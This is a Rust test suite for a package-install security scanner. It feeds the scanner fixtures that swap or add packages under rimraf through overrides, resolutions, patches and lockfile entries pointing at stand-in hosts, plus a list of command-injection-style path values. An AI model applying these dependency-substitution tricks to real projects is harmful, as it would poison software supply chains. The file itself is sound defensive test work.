const CLEAN_NPM_LOCK: &str = r#"{"name":"x","version":"1.0.0","lockfileVersion":3,"requires":true,"packages":{"":{"name":"x","version":"1.0.0","devDependencies":{"rimraf":"^5.0.0"}},"node_modules/rimraf":{"version":"5.0.10","resolved":"https://registry.npmjs.org/rimraf/-/rimraf-5.0.10.tgz","integrity":"sha512-AAAA","dev":true,"dependencies":{"glob":"^10.3.7"},"bin":{"rimraf":"dist/esm/bin.mjs"}},"node_modules/glob":{"version":"10.4.5","resolved":"https://registry.npmjs.org/glob/-/glob-10.4.5.tgz","integrity":"sha512-BBBB","dev":true},"node_modules/@isaacs/cliui":{"version":"8.0.2","resolved":"https://registry.npmjs.org/@isaacs/cliui/-/cliui-8.0.2.tgz","integrity":"sha512-CCCC","dev":true}}}"#;

/// Every override / resolution / pnpm field that can swap or add a package
/// below rimraf keeps INSTALL-004 Medium, including the Codex example (an
/// override of one of rimraf's own dependencies with a package that exports
/// a `rimraf` bin). The tool's own name appears in none of them, which is
/// what `overrides_in` checked.
#[test]
fn an_override_of_a_transitive_dependency_keeps_install004() {
    // Control: the plain shape is rewritten.
    assert_prepare(&[("package.json", rimraf_prepare(""))], true, "control");
    for extra in [
        // Codex: replace one of rimraf's dependencies with an attacker package.
        r#", "overrides": { "glob": "npm:fake-glob-with-rimraf-bin@1.0.0" }"#,
        r#", "overrides": { "glob": "github:example/glob" }"#,
        r#", "overrides": { "minimatch": "9.0.7" }"#,
        r#", "overrides": { "@isaacs/cliui": { "string-width": "npm:fake-sw@1.0.0" } }"#,
        r#", "overrides": { "foo@1": { ".": "2.0.0" } }"#,
        r#", "resolutions": { "**/glob": "https://registry.example.invalid/glob.tgz" }"#,
        r#", "resolutions": { "glob": "patch:glob@npm:10.4.5#./fake.patch" }"#,
        r#", "resolutions": { "jackspeak": "1.0.0" }"#,
        r#", "pnpm": { "overrides": { "glob": "link:./vendor/glob" } }"#,
        r#", "pnpm": { "overrides": { "rimraf>glob": "npm:fake-glob@1.0.0" } }"#,
        // Add a dependency to rimraf's (or glob's) own manifest.
        r#", "pnpm": { "packageExtensions": { "glob@*": { "dependencies": { "fake-bin-pkg": "1.0.0" } } } }"#,
        r#", "pnpm": { "patchedDependencies": { "glob@10.4.5": "patches/glob.patch" } }"#,
        // A field of the wrong type fails closed.
        r#", "overrides": "glob@npm:fake-glob@1.0.0""#,
        r#", "resolutions": ["glob"]"#,
        r#", "pnpm": "overrides""#,
    ] {
        assert_prepare(
            &[("package.json", rimraf_prepare(extra))],
            false,
            &format!("rimraf prepare with {extra}"),
        );
    }
    // Empty blocks and unrelated pnpm settings change nothing.
    for extra in [
        r#", "overrides": {}"#,
        r#", "resolutions": {}"#,
        r#", "pnpm": { "overrides": {}, "packageExtensions": {} }"#,
        r#", "pnpm": { "onlyBuiltDependencies": ["esbuild"] }"#,
    ] {
        assert_prepare(
            &[("package.json", rimraf_prepare(extra))],
            true,
            &format!("rimraf prepare with {extra}"),
        );
    }
}

/// The same holds for every rewrite and wherever the declaration sits: the
/// guard (INSTALL-011) and the inert postinstall (INSTALL-010) keep
/// INSTALL-003 Critical; a workspace root's or member's override applies to
/// the whole workspace; a parent project's `package.json` (no `workspaces`)
/// holds the overrides of an install run from there.
#[test]
fn an_override_anywhere_in_scope_keeps_every_rewrite() {
    let over = r#", "overrides": { "glob": "npm:fake-glob@1.0.0" }"#;
    assert_install_key(
        &[(
            "package.json",
            pkg(r#""preinstall": "npx only-allow pnpm""#, over),
        )],
        None,
        "only-allow with an override",
    );
    assert_install_key(
        &[
            ("package.json", pkg(r#""postinstall": "node ./s.js""#, over)),
            ("s.js", "console.log(process.platform)\n".to_string()),
        ],
        None,
        "inert postinstall with an override",
    );
    let ext = r#", "pnpm": { "packageExtensions": { "only-allow@*": { "dependencies": { "fake-bin-pkg": "1.0.0" } } } }"#;
    assert_install_key(
        &[(
            "package.json",
            pkg(r#""preinstall": "npx only-allow pnpm""#, ext),
        )],
        None,
        "only-allow with a package extension",
    );
    // Controls: without the override both are rewritten.
    assert_install_key(
        &[(
            "package.json",
            pkg(r#""preinstall": "npx only-allow pnpm""#, ""),
        )],
        Some("INSTALL-011"),
        "only-allow control",
    );
    assert_install_key(
        &[
            ("package.json", pkg(r#""postinstall": "node ./s.js""#, "")),
            ("s.js", "console.log(process.platform)\n".to_string()),
        ],
        Some("INSTALL-010"),
        "inert postinstall control",
    );

    // Workspaces: the member's prepare, the root's override; and the root's
    // prepare, a member's override.
    let root = |scripts: &str, extra: &str| {
        pkg(
            scripts,
            &format!(r#", "workspaces": ["packages/*"]{extra}"#),
        )
    };
    let member =
        |extra: &str| format!("{{\n  \"name\": \"h\",\n  \"version\": \"1.0.0\"{extra}\n}}\n");
    assert_prepare(
        &[
            ("package.json", root("", over)),
            ("packages/h/package.json", pkg(RIMRAF_PREPARE, RIMRAF_DEV)),
        ],
        false,
        "member prepare, root override",
    );
    assert_prepare(
        &[
            ("package.json", root(RIMRAF_PREPARE, RIMRAF_DEV)),
            ("packages/h/package.json", member(over)),
        ],
        false,
        "root prepare, member override",
    );
    assert_prepare(
        &[
            ("package.json", root(RIMRAF_PREPARE, RIMRAF_DEV)),
            ("packages/h/package.json", member("")),
        ],
        true,
        "workspace control",
    );
    // A parent project that is not a workspace.
    assert_prepare(
        &[
            ("app/package.json", pkg(RIMRAF_PREPARE, RIMRAF_DEV)),
            ("package.json", pkg("", over)),
        ],
        false,
        "parent package.json override",
    );
    assert_prepare(
        &[
            ("app/package.json", pkg(RIMRAF_PREPARE, RIMRAF_DEV)),
            ("package.json", pkg("", "")),
        ],
        true,
        "parent package.json control",
    );
}

/// pnpm reads overrides, package extensions and patches from
/// `pnpm-workspace.yaml` too, and yarn reads package extensions from
/// `.yarnrc.yml`.
#[test]
fn a_workspace_or_yarn_config_override_keeps_install004() {
    let plain = || rimraf_prepare("");
    for (name, body) in [
        (
            "pnpm-workspace.yaml",
            "packages:\n  - 'packages/*'\noverrides:\n  glob: npm:fake-glob@1.0.0\n",
        ),
        (
            "pnpm-workspace.yaml",
            "overrides:\n  \"rimraf>glob\": link:./vendor/glob\n",
        ),
        (
            "pnpm-workspace.yaml",
            "packageExtensions:\n  glob@*:\n    dependencies:\n      fake-bin-pkg: 1.0.0\n",
        ),
        (
            "pnpm-workspace.yaml",
            "patchedDependencies:\n  glob@10.4.5: patches/glob.patch\n",
        ),
        (
            "pnpm-workspace.yaml",
            "configDependencies:\n  fake-config: 1.0.0+sha512-AAAA\n",
        ),
        ("pnpm-workspace.yaml", "pnpmfile: ./hooks.cjs\n"),
        // Does not parse.
        ("pnpm-workspace.yaml", "overrides: [glob\n  : {\n"),
        ("pnpm-workspace.yaml", "- packages/*\n"),
        (
            ".yarnrc.yml",
            "packageExtensions:\n  \"glob@*\":\n    dependencies:\n      fake-bin-pkg: 1.0.0\n",
        ),
    ] {
        assert_prepare(
            &[("package.json", plain()), (name, body.to_string())],
            false,
            &format!("{name}: {}", body.trim()),
        );
    }
    // A pnpm-workspace.yaml with only a packages list (or nothing) does not.
    for body in [
        "packages:\n  - 'packages/*'\n",
        "",
        "onlyBuiltDependencies:\n  - esbuild\n",
    ] {
        assert_prepare(
            &[
                ("package.json", plain()),
                ("pnpm-workspace.yaml", body.to_string()),
            ],
            true,
            &format!("benign pnpm-workspace.yaml {body:?}"),
        );
    }
}

/// Any lockfile entry off the public registry, under any name, keeps
/// INSTALL-004: a lockfile decides what `npm ci`, `yarn install
/// --frozen-lockfile` and `pnpm install` fetch for every package in the tree,
/// not only the tool. So does a lockfile that does not parse.
#[test]
fn a_lockfile_entry_off_the_registry_keeps_install004() {
    let plain = || rimraf_prepare("");
    let off_npm: &[(&str, &str)] = &[
        // A transitive dependency fetched from another host.
        (
            "package-lock.json",
            r#"{"lockfileVersion":3,"packages":{"":{},"node_modules/rimraf":{"version":"5.0.10","resolved":"https://registry.npmjs.org/rimraf/-/rimraf-5.0.10.tgz"},"node_modules/glob":{"version":"10.4.5","resolved":"https://registry.example.invalid/glob/-/glob-10.4.5.tgz"}}}"#,
        ),
        // From git.
        (
            "package-lock.json",
            r#"{"lockfileVersion":3,"packages":{"node_modules/glob":{"version":"10.4.5","resolved":"git+ssh://git@github.com/example/glob.git#0123456789abcdef"}}}"#,
        ),
        // Another package's tarball on the public registry (an alias).
        (
            "package-lock.json",
            r#"{"lockfileVersion":3,"packages":{"node_modules/glob":{"version":"1.0.0","resolved":"https://registry.npmjs.org/fake-glob/-/fake-glob-1.0.0.tgz"}}}"#,
        ),
        (
            "package-lock.json",
            r#"{"lockfileVersion":3,"packages":{"node_modules/glob":{"name":"fake-glob","version":"1.0.0","resolved":"https://registry.npmjs.org/fake-glob/-/fake-glob-1.0.0.tgz"}}}"#,
        ),
        // A link to a directory, and that directory's own entry.
        (
            "package-lock.json",
            r#"{"lockfileVersion":3,"packages":{"node_modules/glob":{"resolved":"vendor/glob","link":true}}}"#,
        ),
        (
            "package-lock.json",
            r#"{"lockfileVersion":3,"packages":{"vendor/glob":{"name":"glob","version":"10.4.5"}}}"#,
        ),
        // Lockfile v1: a file: spec, and a nested off-registry dependency.
        (
            "package-lock.json",
            r#"{"lockfileVersion":1,"dependencies":{"glob":{"version":"file:vendor/glob"}}}"#,
        ),
        (
            "package-lock.json",
            r#"{"lockfileVersion":1,"dependencies":{"rimraf":{"version":"5.0.10","resolved":"https://registry.npmjs.org/rimraf/-/rimraf-5.0.10.tgz","dependencies":{"glob":{"version":"10.4.5","resolved":"https://registry.example.invalid/glob-10.4.5.tgz"}}}}}"#,
        ),
        (
            "package-lock.json",
            r#"{"lockfileVersion":1,"dependencies":{"glob":{"version":"npm:fake-glob@1.0.0","resolved":"https://registry.npmjs.org/fake-glob/-/fake-glob-1.0.0.tgz"}}}"#,
        ),
        // Does not parse, or not an object.
        ("package-lock.json", "{\"lockfileVersion\":3,"),
        ("package-lock.json", "[]"),
        (
            "npm-shrinkwrap.json",
            r#"{"lockfileVersion":3,"packages":{"node_modules/glob":{"version":"10.4.5","resolved":"https://registry.example.invalid/glob-10.4.5.tgz"}}}"#,
        ),
    ];
    for (name, body) in off_npm {
        assert_prepare(
            &[("package.json", plain()), (name, body.to_string())],
            false,
            &format!("{name}: {body}"),
        );
    }
    let off_yarn = [
        // Classic: a transitive dependency from another host, from git, an
        // alias, and lines this pass does not know.
        "# yarn lockfile v1\n\nrimraf@^5.0.0:\n  version \"5.0.10\"\n  resolved \"https://registry.yarnpkg.com/rimraf/-/rimraf-5.0.10.tgz#abc\"\n  dependencies:\n    glob \"^10.3.7\"\n\nglob@^10.3.7:\n  version \"10.4.5\"\n  resolved \"https://registry.example.invalid/glob/-/glob-10.4.5.tgz#abc\"\n",
        "# yarn lockfile v1\n\n\"glob@github:example/glob\":\n  version \"10.4.5\"\n  resolved \"https://codeload.github.com/example/glob/tar.gz/0123456\"\n",
        "# yarn lockfile v1\n\n\"glob@npm:fake-glob@^1.0.0\":\n  version \"1.0.0\"\n  resolved \"https://registry.yarnpkg.com/fake-glob/-/fake-glob-1.0.0.tgz#abc\"\n",
        "# yarn lockfile v1\n\nglob@^10.3.7:\n  version \"10.4.5\"\n  resolved \"https://registry.yarnpkg.com/fake-glob/-/fake-glob-1.0.0.tgz#abc\"\n",
        "# yarn lockfile v1\n\nglob@^10.3.7:\n  version \"10.4.5\"\n  preinstall \"x\"\n",
        "not a lockfile at all",
        // Berry: a URL resolution, an alias, a link, and a patch of a file.
        "__metadata:\n  version: 8\n\n\"glob@npm:^10.3.7\":\n  version: 10.4.5\n  resolution: \"glob@https://registry.example.invalid/glob.tgz\"\n  linkType: hard\n",
        "__metadata:\n  version: 8\n\n\"glob@npm:fake-glob@^1.0.0\":\n  version: 1.0.0\n  resolution: \"fake-glob@npm:1.0.0\"\n  linkType: hard\n",
        "__metadata:\n  version: 8\n\n\"glob@link:./vendor/glob\":\n  version: 0.0.0-use.local\n  resolution: \"glob@link:./vendor/glob::locator=x%40workspace%3A.\"\n  linkType: soft\n",
        "__metadata:\n  version: 8\n\n\"glob@patch:glob@npm%3A10.4.5#./fake.patch\":\n  version: 10.4.5\n  resolution: \"glob@patch:glob@npm%3A10.4.5#./fake.patch::version=10.4.5&hash=abc\"\n  linkType: hard\n",
        "__metadata:\n  version: 8\n\n\"glob@npm:^10.3.7\": [\n",
    ];
    for body in off_yarn {
        assert_prepare(
            &[("package.json", plain()), ("yarn.lock", body.to_string())],
            false,
            &format!("yarn.lock: {body}"),
        );
    }
    let off_pnpm = [
        "lockfileVersion: '9.0'\npackages:\n  glob@10.4.5:\n    resolution: {tarball: https://registry.example.invalid/glob-10.4.5.tgz}\n",
        "lockfileVersion: '9.0'\npackages:\n  glob@https://codeload.github.com/example/glob/tar.gz/0123456:\n    resolution: {tarball: https://codeload.github.com/example/glob/tar.gz/0123456}\n",
        "lockfileVersion: '9.0'\npackages:\n  glob@10.4.5:\n    resolution: {type: git, repo: https://github.com/example/glob, commit: 0123456}\n",
        "lockfileVersion: '9.0'\npackages:\n  glob@10.4.5:\n    resolution: {directory: vendor/glob, type: directory}\n",
        "lockfileVersion: '9.0'\noverrides:\n  glob: npm:fake-glob@1.0.0\n",
        "lockfileVersion: '9.0'\npackageExtensionsChecksum: sha256-AAAA\n",
        "lockfileVersion: '9.0'\npatchedDependencies:\n  glob@10.4.5:\n    hash: abc\n    path: patches/glob.patch\n",
        "lockfileVersion: '9.0'\nimporters:\n  .:\n    devDependencies:\n      rimraf:\n        specifier: ^5.0.0\n        version: 5.0.10\n      glob:\n        specifier: link:vendor/glob\n        version: link:vendor/glob\n",
        "lockfileVersion: '9.0'\nsnapshots:\n  rimraf@5.0.10:\n    dependencies:\n      glob: fake-glob@1.0.0\n",
        "lockfileVersion: '9.0'\nsnapshots:\n  glob@10.4.5(patch_hash=abc):\n    dependencies: {}\n",
        "lockfileVersion: '6.0'\ndevDependencies:\n  rimraf:\n    specifier: ^5.0.0\n    version: /fake-rimraf@5.0.10\n",
        "packages:\n  glob@10.4.5:\n    resolution: {integrity: sha512-AAAA}\n",
        "lockfileVersion: '9.0'\npackages: [\n",
    ];
    for body in off_pnpm {
        assert_prepare(
            &[
                ("package.json", plain()),
                ("pnpm-lock.yaml", body.to_string()),
            ],
            false,
            &format!("pnpm-lock.yaml: {body}"),
        );
    }
    // A bun lockfile is not read, so it always counts.
    for name in ["bun.lock", "bun.lockb"] {
        assert_prepare(
            &[("package.json", plain()), (name, "{}".to_string())],
            false,
            name,
        );
    }
    // The guard and the inert postinstall fail closed the same way.
    let lock = off_npm[0].1.to_string();
    assert_install_key(
        &[
            (
                "package.json",
                pkg(r#""preinstall": "npx only-allow pnpm""#, ""),
            ),
            ("package-lock.json", lock.clone()),
        ],
        None,
        "only-allow with an off-registry lockfile",
    );
    assert_install_key(
        &[
            ("package.json", pkg(r#""postinstall": "node ./s.js""#, "")),
            ("s.js", "console.log(process.platform)\n".to_string()),
            ("package-lock.json", lock.clone()),
        ],
        None,
        "inert postinstall with an off-registry lockfile",
    );
    // A lockfile at a workspace root, in a member, or above the package.
    let root = pkg("", r#", "workspaces": ["packages/*"]"#);
    assert_prepare(
        &[
            ("package.json", root.clone()),
            ("packages/h/package.json", pkg(RIMRAF_PREPARE, RIMRAF_DEV)),
            ("package-lock.json", lock.clone()),
        ],
        false,
        "member prepare, root lockfile",
    );
    assert_prepare(
        &[
            (
                "package.json",
                pkg(
                    RIMRAF_PREPARE,
                    &format!(r#"{RIMRAF_DEV}, "workspaces": ["packages/*"]"#),
                ),
            ),
            ("packages/h/package.json", pkg("", "")),
            ("packages/h/yarn.lock", off_yarn[0].to_string()),
        ],
        false,
        "root prepare, member lockfile",
    );
    assert_prepare(
        &[
            ("app/package.json", pkg(RIMRAF_PREPARE, RIMRAF_DEV)),
            ("pnpm-lock.yaml", off_pnpm[0].to_string()),
        ],
        false,
        "lockfile above the package",
    );
}

/// Package-manager files are read straight from disk, so one that is not a
/// regular file must neither block the scan nor pass: a lockfile, `.npmrc`
/// or parent `package.json` that is a directory or a link to a device keeps
/// the original finding, and the scan returns.
#[test]
fn an_unreadable_install_file_keeps_install004() {
    for name in [
        "package-lock.json",
        "yarn.lock",
        "pnpm-lock.yaml",
        "pnpm-workspace.yaml",
        ".npmrc",
    ] {
        let dir = tempfile::tempdir().unwrap();
        write_tree(dir.path(), &[("package.json", &rimraf_prepare(""))]);
        fs::create_dir_all(dir.path().join(name).join("x")).unwrap();
        let r = run_scan(dir.path(), None, None);
        let found = rules(&r);
        assert!(
            found.iter().any(|(id, _)| id == "INSTALL-004")
                && !found.iter().any(|(id, _)| id == "INSTALL-012"),
            "{name} as a directory: {found:?}"
        );
    }
    #[cfg(unix)]
    for name in ["package-lock.json", ".npmrc", "yarn.lock"] {
        // A link to an endless device: reading it would never return.
        let dir = tempfile::tempdir().unwrap();
        write_tree(dir.path(), &[("app/package.json", &rimraf_prepare(""))]);
        std::os::unix::fs::symlink("/dev/zero", dir.path().join(name)).unwrap();
        let r = run_scan(dir.path(), None, None);
        let found = rules(&r);
        assert!(
            found.iter().any(|(id, _)| id == "INSTALL-004")
                && !found.iter().any(|(id, _)| id == "INSTALL-012"),
            "{name} linked to /dev/zero: {found:?}"
        );
    }
    #[cfg(unix)]
    {
        // A parent package.json that is a link to a device.
        let dir = tempfile::tempdir().unwrap();
        write_tree(dir.path(), &[("app/package.json", &rimraf_prepare(""))]);
        std::os::unix::fs::symlink("/dev/zero", dir.path().join("package.json")).unwrap();
        let r = run_scan(dir.path(), None, None);
        assert!(
            !rules(&r).iter().any(|(id, _)| id == "INSTALL-012"),
            "parent package.json linked to /dev/zero: {:?}",
            rules(&r)
        );
    }
}

/// Lockfiles whose every entry is a public-registry package under its own
/// name leave the rewrite in place, in each format.
#[test]
fn a_registry_only_lockfile_keeps_the_rewrite() {
    let plain = || rimraf_prepare("");
    let clean: &[(&str, &str)] = &[
        ("package-lock.json", CLEAN_NPM_LOCK),
        ("npm-shrinkwrap.json", CLEAN_NPM_LOCK),
        // v1, with a nested and a bundled dependency.
        (
            "package-lock.json",
            r#"{"lockfileVersion":1,"dependencies":{"rimraf":{"version":"5.0.10","resolved":"https://registry.npmjs.org/rimraf/-/rimraf-5.0.10.tgz","dependencies":{"glob":{"version":"10.4.5","resolved":"https://registry.npmjs.org/glob/-/glob-10.4.5.tgz"},"ansi-regex":{"version":"6.0.1","bundled":true}}}}}"#,
        ),
        (
            "yarn.lock",
            "# THIS IS AN AUTOGENERATED FILE. DO NOT EDIT THIS FILE DIRECTLY.\n# yarn lockfile v1\n\n\n\"@isaacs/cliui@^8.0.2\":\n  version \"8.0.2\"\n  resolved \"https://registry.yarnpkg.com/@isaacs/cliui/-/cliui-8.0.2.tgz#b37667b7bc181c168782259bab42474fbf52b550\"\n  integrity sha512-AAAA\n  dependencies:\n    string-width \"^5.1.2\"\n\nglob@^10.3.7, glob@^10.4.1:\n  version \"10.4.5\"\n  resolved \"https://registry.npmjs.org/glob/-/glob-10.4.5.tgz#abc\"\n  integrity sha512-BBBB\n\nrimraf@^5.0.0:\n  version \"5.0.10\"\n  resolved \"https://registry.yarnpkg.com/rimraf/-/rimraf-5.0.10.tgz#abc\"\n  integrity sha512-CCCC\n  dependencies:\n    glob \"^10.3.7\"\n",
        ),
        (
            "yarn.lock",
            "# This file is generated by running \"yarn install\" inside your project.\n\n__metadata:\n  version: 8\n  cacheKey: 10c0\n\n\"glob@npm:^10.3.7\":\n  version: 10.4.5\n  resolution: \"glob@npm:10.4.5\"\n  checksum: 10c0/abc\n  languageName: node\n  linkType: hard\n\n\"rimraf@npm:^5.0.0\":\n  version: 5.0.10\n  resolution: \"rimraf@npm:5.0.10\"\n  dependencies:\n    glob: \"npm:^10.3.7\"\n  bin:\n    rimraf: dist/esm/bin.mjs\n  checksum: 10c0/def\n  languageName: node\n  linkType: hard\n\n\"typescript@patch:typescript@npm%3A^5#optional!builtin<compat/typescript>\":\n  version: 5.9.3\n  resolution: \"typescript@patch:typescript@npm%3A5.9.3#optional!builtin<compat/typescript>::version=5.9.3&hash=5786d5\"\n  languageName: node\n  linkType: hard\n\n\"x@workspace:.\":\n  version: 0.0.0-use.local\n  resolution: \"x@workspace:.\"\n  dependencies:\n    rimraf: \"npm:^5.0.0\"\n  languageName: unknown\n  linkType: soft\n",
        ),
        (
            "pnpm-lock.yaml",
            "lockfileVersion: '9.0'\n\nsettings:\n  autoInstallPeers: true\n  excludeLinksFromLockfile: false\n\nimporters:\n\n  .:\n    devDependencies:\n      rimraf:\n        specifier: ^5.0.0\n        version: 5.0.10\n\npackages:\n\n  '@isaacs/cliui@8.0.2':\n    resolution: {integrity: sha512-AAAA}\n    engines: {node: '>=12'}\n\n  glob@10.4.5:\n    resolution: {integrity: sha512-BBBB}\n    hasBin: true\n\n  rimraf@5.0.10:\n    resolution: {integrity: sha512-CCCC}\n    hasBin: true\n\nsnapshots:\n\n  '@isaacs/cliui@8.0.2': {}\n\n  glob@10.4.5:\n    dependencies:\n      '@isaacs/cliui': 8.0.2\n\n  rimraf@5.0.10:\n    dependencies:\n      glob: 10.4.5\n",
        ),
        (
            "pnpm-lock.yaml",
            "lockfileVersion: '6.0'\n\ndevDependencies:\n  rimraf:\n    specifier: ^5.0.0\n    version: 5.0.10\n\npackages:\n\n  /glob@10.4.5:\n    resolution: {integrity: sha512-BBBB}\n    dependencies:\n      '@isaacs/cliui': 8.0.2(react@18.2.0)\n    dev: true\n\n  /rimraf@5.0.10:\n    resolution: {integrity: sha512-CCCC}\n    hasBin: true\n    dependencies:\n      glob: 10.4.5\n    dev: true\n",
        ),
    ];
    for (name, body) in clean {
        assert_prepare(
            &[("package.json", plain()), (name, body.to_string())],
            true,
            &format!("clean {name}: {body}"),
        );
    }
}

// ---------------------------------------------------------------------------
// Unit checks
// ---------------------------------------------------------------------------

#[test]
fn the_path_validator_accepts_only_package_relative_paths() {
    for ok in [
        "dist",
        "dist/*.js",
        "./dist",
        "build/index.js",
        "tsconfig.build.json",
        ".",
    ] {
        assert!(is_package_relative_path(ok), "{ok}");
    }
    for bad in [
        "",
        "/",
        "/tmp",
        "~",
        "~/x",
        "$HOME",
        "${HOME}",
        "..",
        "../x",
        "a/../../b",
        "-rf",
        "a b",
        "a;b",
        "`x`",
        "a|b",
        "a&b",
        "\"x\"",
        "x\\y",
    ] {
        assert!(!is_package_relative_path(bad), "{bad}");
    }
}

/// The launcher check trusts a name only when the one `const` declaring it
/// is the binding in scope where it is used. `USE` marks the use site.
#[test]
fn single_const_trusts_only_an_unshadowed_const() {
    let resolve = |src: &str| {
        let use_at = src.find("USE").expect("marker");
        let s = Source::new(src).expect("lexes");
        s.single_const("X", use_at).map(|(_, rhs)| rhs.to_string())
    };
    for ok in [
        "const X = 1\nUSE",
        "const X = 1\nif (X) { USE }",
        "const X = 1\nfoo(X)\nUSE",
        "const X = 1\nconst o = { X }\nUSE",
        "const X = 1\n// X = 2\nUSE",
        "const X = 1\nconst s = 'X = 2'\nUSE",
        "const X = 1\nconst t = `${X}-${o.X}`\nUSE",
        "function f() {\n  const X = 1\n  USE\n}",
        "#!/usr/bin/env node\nconst X = 1\nconst r = /x/g\nUSE",
    ] {
        assert_eq!(resolve(ok).as_deref(), Some("1"), "{ok}");
    }
    for bad in [
        "let X = 1\nUSE",
        "var X = 1\nUSE",
        "const X = 1\nX = 2\nUSE",
        "const X = 1\nX += 'y'\nUSE",
        "const X = 1\nX++\nUSE",
        "const X = 1\nfunction f(X) { USE }",
        "const X = 1\nfunction f({ a: { X } }) { USE }",
        "const X = 1\nconst g = (a, X) => USE",
        "const X = 1\nconst g = X => USE",
        "const X = 1\nfunction g() { const { ...X } = o; USE }",
        "const X = 1\nfunction g() { const [X] = o; USE }",
        "const X = 1\nfor (X of xs) {}\nUSE",
        "const X = 1\ntry {} catch (X) { USE }",
        "const X = 1\nfunction X() {}\nUSE",
        "const X = 1\nclass X {}\nUSE",
        "{ const X = 1 }\nUSE",
        "for (const X = 1; ;) { break }\nUSE",
        "USE\nconst X = 1",
        "const X = 1\nconst X = 2\nUSE",
    ] {
        assert_eq!(resolve(bad), None, "{bad}");
    }
    // Text that does not lex is not trusted at all.
    assert!(Source::new("const X = 'unterminated\nUSE").is_none());
    assert!(Source::new("const X = (1\nUSE").is_none());
}

#[test]
fn the_inert_test_reads_the_real_postinstall() {
    let specs = inert_source(INERT_POSTINSTALL).expect("the Microsoft postinstall is inert");
    assert!(specs.contains(&Spec::Builtin("os")));
    assert!(specs.contains(&Spec::Json("../package.json".to_string())));
    // Allowlisted forms.
    for ok in [
        "const { platform, arch } = require('os');\nconsole.log(platform(), arch());\n",
        "import os from 'node:os';\nconsole.log(os.platform());\n",
        "import { platform as p } from 'os';\nconsole.log(p());\n",
        "const path = require('path');\nconsole.log(path.join('a', 'b'), process.argv[2]);\n",
        "console.log(`see https://x.example/docs`);\n",
        "if (require('os').platform() === 'win32') process.exit(0);\n",
    ] {
        assert!(inert_source(ok).is_ok(), "{ok}: {:?}", inert_source(ok));
    }
}
